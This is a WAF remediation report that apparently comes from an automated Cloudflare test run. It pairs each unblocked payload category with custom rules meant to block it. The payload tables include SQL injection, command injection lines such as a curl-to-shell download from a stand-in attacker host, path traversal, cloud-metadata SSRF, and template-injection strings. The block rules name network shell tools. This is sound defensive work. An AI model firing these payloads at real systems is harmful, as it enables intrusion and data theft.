# Cloudflare WAF Remediation Recommendations

**Generated from WAF Test Results**  
**Protection Score: 53.8%**  
**Tests Not Blocked: 76 of 225**

---

## Executive Summary

The WAF testing identified several vulnerability categories where attacks were not blocked by the current Cloudflare WAF configuration. This document provides specific remediation steps for each category using Cloudflare's WAF features.

---

## 1. SQL Injection (SQLi)

### Vulnerabilities Not Blocked:
| Test Name | Payload |
|-----------|---------|
| SQLi: Basic SQLi - OR bypass | `' OR '1'='1` |
| SQLi: SQLi with block comment | `' OR '1'='1'/*` |
| SQLi: SQLi AND condition | `1' AND '1'='1` |
| SQLi: Simple auth bypass | `admin'--` |
| SQLi: ORDER BY injection | `1' ORDER BY 1--+` |
| SQLi: GROUP BY injection | `1' GROUP BY 1--+` |
| SQLi: MSSQL shutdown | `1'; SHUTDOWN;--` |

### Cloudflare WAF Remediation:

#### A. Enable OWASP Core Ruleset with Higher Paranoia Level
1. Navigate to **Security → WAF → Managed Rules**
2. Enable **Cloudflare OWASP Core Ruleset**
3. Click **Configure** on the OWASP ruleset
4. Set **Paranoia Level to 2 or 3** (higher levels catch more evasion techniques)
5. Set **Anomaly Score Threshold** to **Medium (25)** or **Low (10)**

#### B. Create Custom WAF Rules
Navigate to **Security → WAF → Custom Rules** and create:

```
Rule 1: Block SQL Comment Attacks
Expression: (http.request.uri.query contains "/*" and http.request.uri.query contains "*/") or 
            (http.request.uri.query contains "--" and http.request.uri.query contains "'")
Action: Block

Rule 2: Block SQL Keywords in Query Strings
Expression: lower(http.request.uri.query) contains "order by" or 
            lower(http.request.uri.query) contains "group by" or
            lower(http.request.uri.query) contains "shutdown"
Action: Block

Rule 3: Block Basic SQLi Patterns
Expression: http.request.uri.query contains "' or '" or
            http.request.uri.query contains "' and '"
Action: Block
```

#### C. Enable Specific OWASP Rules
In **Managed Rules → OWASP**, ensure these rule groups are set to **Block**:
- **942100-942999**: SQL Injection Attack rules
- **942200**: SQL Comment Sequence Detection
- **942260**: SQL Injection bypass via tautology

---

## 2. Command Injection (CMDi)

### Vulnerabilities Not Blocked:
| Test Name | Payload |
|-----------|---------|
| CMDi: Basic command injection | `; ls -la` |
| CMDi: Pipe command injection | `\| cat /etc/passwd` |
| CMDi: Ampersand command injection | `& whoami` |
| CMDi: Backtick command injection | `` `id` `` |
| CMDi: Dollar command injection | `$(id)` |
| CMDi: AND command injection | `&& id` |
| CMDi: Ping command injection | `; ping -c 10 127.0.0.1` |
| CMDi: Curl shell download | `; curl http://attacker.com/shell.sh \| sh` |

### Cloudflare WAF Remediation:

#### A. Enable OWASP Command Injection Rules
1. Navigate to **Security → WAF → Managed Rules → OWASP**
2. Enable rule group **932100-932999** (Remote Command Execution)
3. Set action to **Block**

#### B. Create Custom WAF Rules
```
Rule 1: Block Shell Command Characters
Expression: http.request.uri.query contains "|" or
            http.request.uri.query contains ";" or
            http.request.uri.query contains "&&" or
            http.request.uri.query contains "`" or
            http.request.uri.query contains "$("
Action: Block

Rule 2: Block Common Shell Commands
Expression: lower(http.request.uri.query) regex "\\b(cat|ls|id|whoami|wget|curl|ping|nc|bash|sh)\\b"
Action: Block

Rule 3: Block /etc/passwd Access
Expression: http.request.uri contains "/etc/passwd" or
            http.request.uri.query contains "/etc/passwd"
Action: Block
```

#### C. Enable Cloudflare Managed Ruleset
1. Navigate to **Security → WAF → Managed Rules**
2. Enable **Cloudflare Managed Ruleset**
3. Ensure **Command Injection** category is set to **Block**

---

## 3. Path Traversal / Local File Inclusion (LFI)

### Vulnerabilities Not Blocked:
| Test Name | Payload |
|-----------|---------|
| LFI: URL encoded traversal | `..%2f..%2f..%2fetc/passwd` |
| LFI: Null byte injection | `/etc/passwd%00` |
| LFI: Full URL encoded | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` |

### Cloudflare WAF Remediation:

#### A. Enable URL Normalization
1. Navigate to **Rules → Settings**
2. Enable **Normalize incoming URLs** - this decodes URL encoding before WAF inspection

#### B. Enable OWASP LFI Rules
1. Navigate to **Security → WAF → Managed Rules → OWASP**
2. Enable rule group **930100-930199** (Local File Inclusion)
3. Set action to **Block**

#### C. Create Custom WAF Rules
```
Rule 1: Block Path Traversal (Encoded)
Expression: http.request.uri contains "%2e%2e" or
            http.request.uri contains "%2f%2e%2e" or
            http.request.uri contains "..%2f" or
            http.request.uri contains "%2f.."
Action: Block

Rule 2: Block Null Byte Injection
Expression: http.request.uri contains "%00" or
            http.request.uri.query contains "%00"
Action: Block

Rule 3: Block Sensitive File Access
Expression: http.request.uri contains "/etc/" or
            http.request.uri contains "/proc/" or
            http.request.uri contains "/var/log/"
Action: Block
```

---

## 4. Server-Side Request Forgery (SSRF)

### Vulnerabilities Not Blocked:
| Test Name | Payload |
|-----------|---------|
| SSRF: Localhost SSRF | `http://localhost/admin` |
| SSRF: Loopback SSRF | `http://127.0.0.1/admin` |
| SSRF: IPv6 localhost SSRF | `http://[::1]/admin` |
| SSRF: AWS metadata SSRF | `http://169.254.169.254/latest/meta-data/` |
| SSRF: GCP metadata SSRF | `http://metadata.google.internal/` |
| SSRF: Azure metadata SSRF | `http://169.254.169.254/metadata/` |
| SSRF: Zero IP SSRF | `http://0.0.0.0/` |
| SSRF: Short loopback SSRF | `http://127.1/` |
| SSRF: Decimal IP SSRF | `http://2130706433/` (decimal for 127.0.0.1) |
| SSRF: Hex IP SSRF | `http://0x7f000001/` |
| SSRF: Dict protocol SSRF | `dict://localhost:11211/` |
| SSRF: File protocol SSRF | `file:///etc/passwd` |

### Cloudflare WAF Remediation:

#### A. Create Comprehensive SSRF Custom Rules
```
Rule 1: Block Localhost/Loopback in Parameters
Expression: lower(http.request.uri.query) contains "localhost" or
            http.request.uri.query contains "127.0.0.1" or
            http.request.uri.query contains "127.1" or
            http.request.uri.query contains "0.0.0.0" or
            http.request.uri.query contains "[::1]"
Action: Block

Rule 2: Block Cloud Metadata Endpoints
Expression: http.request.uri.query contains "169.254.169.254" or
            http.request.uri.query contains "metadata.google.internal" or
            http.request.uri.query contains "metadata/instance"
Action: Block

Rule 3: Block Alternative IP Representations
Expression: http.request.uri.query regex "http://(0x[0-9a-f]+|[0-9]{8,}|0+\\.[0-9])" or
            http.request.uri.query contains "2130706433"
Action: Block

Rule 4: Block Non-HTTP Protocols
Expression: lower(http.request.uri.query) contains "file://" or
            lower(http.request.uri.query) contains "dict://" or
            lower(http.request.uri.query) contains "gopher://" or
            lower(http.request.uri.query) contains "ftp://"
Action: Block
```

#### B. Enable OWASP SSRF Rules
1. Navigate to **Security → WAF → Managed Rules → OWASP**
2. Enable rule group **934100-934199** (SSRF Attack)
3. Set Paranoia Level to 2+

---

## 5. Server-Side Template Injection (SSTI)

### Vulnerabilities Not Blocked:
| Test Name | Payload |
|-----------|---------|
| SSTI: Jinja2/Twig basic SSTI | `{{7*7}}` |
| SSTI: Generic template injection | `${7*7}` |
| SSTI: Ruby ERB injection | `<%= 7*7 %>` |
| SSTI: ERB injection | `#{7*7}` |
| SSTI: Flask config disclosure | `{{config}}` |
| SSTI: Python SSTI RCE | `{{''.__class__.__mro__[1].__subclasses__()}}` |

### Cloudflare WAF Remediation:

#### A. Create Custom SSTI Rules
```
Rule 1: Block Template Syntax
Expression: http.request.uri.query contains "{{" or
            http.request.uri.query contains "}}" or
            http.request.uri.query contains "${" or
            http.request.uri.query contains "<%"
Action: Block

Rule 2: Block Python SSTI Patterns
Expression: http.request.uri.query contains "__class__" or
            http.request.uri.query contains "__mro__" or
            http.request.uri.query contains "__subclasses__" or
            http.request.uri.query contains "__globals__"
Action: Block

Rule 3: Block Config/Settings Access
Expression: lower(http.request.uri.query) contains "{{config}}" or
            lower(http.request.uri.query) contains "{{settings}}" or
            lower(http.request.uri.query) contains "{{request}}"
Action: Block
```

---

## 6. Sensitive File Access (Cloudflare Managed Ruleset Gaps)

### Vulnerabilities Not Blocked:
| Test Name | Payload/Path |
|-----------|--------------|
| CF-Managed: Apache htaccess access | `/.htaccess` |
| CF-Managed: Shadow file access | `/etc/shadow` |
| CF-Managed: AWS credentials access | `/.aws/credentials` |
| CF-Managed: Environment file access | `/.env` |
| CF-Managed: Go pprof debug access | `/debug/pprof/` |
| CF-Managed: Apache server status | `/server-status` |
| CF-Managed: WordPress debug log | `/wp-content/debug.log` |

### Cloudflare WAF Remediation:

#### A. Enable Cloudflare Managed Ruleset Categories
1. Navigate to **Security → WAF → Managed Rules → Cloudflare Managed Ruleset**
2. Click **Configure**
3. Set the following categories to **Block**:
   - **Sensitive Files**
   - **Debug Endpoints**
   - **Cloud Credentials**
   - **WordPress** (if applicable)

#### B. Create Custom Rules for Sensitive Paths
```
Rule 1: Block Hidden Files
Expression: http.request.uri.path contains "/." and 
            not http.request.uri.path contains "/.well-known"
Action: Block

Rule 2: Block Debug Endpoints
Expression: http.request.uri.path contains "/debug/" or
            http.request.uri.path contains "/server-status" or
            http.request.uri.path contains "/server-info"
Action: Block

Rule 3: Block Sensitive Config Files
Expression: http.request.uri.path contains ".env" or
            http.request.uri.path contains ".htaccess" or
            http.request.uri.path contains ".htpasswd" or
            http.request.uri.path contains ".git"
Action: Block
```

---

## 7. Scanner Detection

### Vulnerabilities Not Blocked:
| Test Name | User-Agent Pattern |
|-----------|-------------------|
| Scanner: Nikto scanner UA | `Nikto` |
| Scanner: SQLmap scanner UA | `sqlmap` |
| Scanner: ZAP scanner UA | `ZAP` |
| Scanner: Acunetix scanner UA | `Acunetix` |

### Cloudflare WAF Remediation:

#### A. Enable Bot Fight Mode
1. Navigate to **Security → Bots**
2. Enable **Bot Fight Mode** (Free) or **Super Bot Fight Mode** (Pro+)

#### B. Create Scanner Blocking Rules
```
Rule 1: Block Known Scanner User Agents
Expression: lower(http.user_agent) contains "nikto" or
            lower(http.user_agent) contains "sqlmap" or
            lower(http.user_agent) contains "acunetix" or
            lower(http.user_agent) contains "nessus" or
            lower(http.user_agent) contains "openvas" or
            lower(http.user_agent) contains "burp" or
            lower(http.user_agent) contains "zap" or
            lower(http.user_agent) contains "w3af" or
            lower(http.user_agent) contains "nmap"
Action: Block
```

#### C. Rate Limiting for Scanner Behavior
1. Navigate to **Security → WAF → Rate Limiting Rules**
2. Create a rule:
   - **If**: Requests from same IP exceed 100 requests per 10 seconds
   - **Then**: Block for 1 hour

---

## 8. CMS-Specific Attacks (WordPress, Joomla, Drupal)

### Vulnerabilities Not Blocked:
| Test Name | Path |
|-----------|------|
| CF-Managed: WordPress SQLi | Various WP endpoints |
| CF-Managed: phpMyAdmin access | `/phpmyadmin/` |
| CF-Managed: Joomla admin access | `/administrator/` |
| CF-Managed: Drupal settings access | `/sites/default/settings.php` |

### Cloudflare WAF Remediation:

#### A. Enable CMS-Specific Rules
1. Navigate to **Security → WAF → Managed Rules → Cloudflare Managed Ruleset**
2. Enable and set to **Block**:
   - WordPress rules (if using WordPress)
   - Joomla rules (if using Joomla)
   - Drupal rules (if using Drupal)
   - PHP rules

#### B. Block Admin Panel Access by IP
```
Rule 1: Restrict Admin Access
Expression: (http.request.uri.path contains "/wp-admin" or
             http.request.uri.path contains "/administrator" or
             http.request.uri.path contains "/phpmyadmin") and
            not ip.src in {YOUR_ADMIN_IP_LIST}
Action: Block
```

---

## Implementation Priority

| Priority | Category | Risk Level | Effort |
|----------|----------|------------|--------|
| **Critical** | Command Injection | High | Low |
| **Critical** | SSRF (Cloud Metadata) | High | Low |
| **High** | SQL Injection | High | Medium |
| **High** | Path Traversal | High | Low |
| **Medium** | SSTI | Medium | Low |
| **Medium** | Sensitive Files | Medium | Low |
| **Low** | Scanner Detection | Low | Low |

---

## Quick Implementation Checklist

- [ ] Enable OWASP Core Ruleset with Paranoia Level 2
- [ ] Set OWASP Anomaly Threshold to Medium (25)
- [ ] Enable all Cloudflare Managed Ruleset categories
- [ ] Create custom rules for SSRF (cloud metadata IPs)
- [ ] Create custom rules for command injection characters
- [ ] Create custom rules for template injection syntax
- [ ] Enable URL normalization
- [ ] Enable Bot Fight Mode
- [ ] Configure rate limiting
- [ ] Block access to sensitive file paths

---

## Testing After Implementation

After implementing these recommendations, re-run the WAF tester:

```bash
python cf_waf_tester.py --targets your-domain.com --waf-only -o results_after.txt --accept-responsibility
```

Compare the results to verify improved protection.

---

## Additional Resources

- [Cloudflare WAF Documentation](https://developers.cloudflare.com/waf/)
- [Cloudflare OWASP Core Ruleset](https://developers.cloudflare.com/waf/managed-rules/reference/owasp-core-ruleset/)
- [Cloudflare Custom Rules](https://developers.cloudflare.com/waf/custom-rules/)
- [OWASP Top 10](https://owasp.org/Top10/)
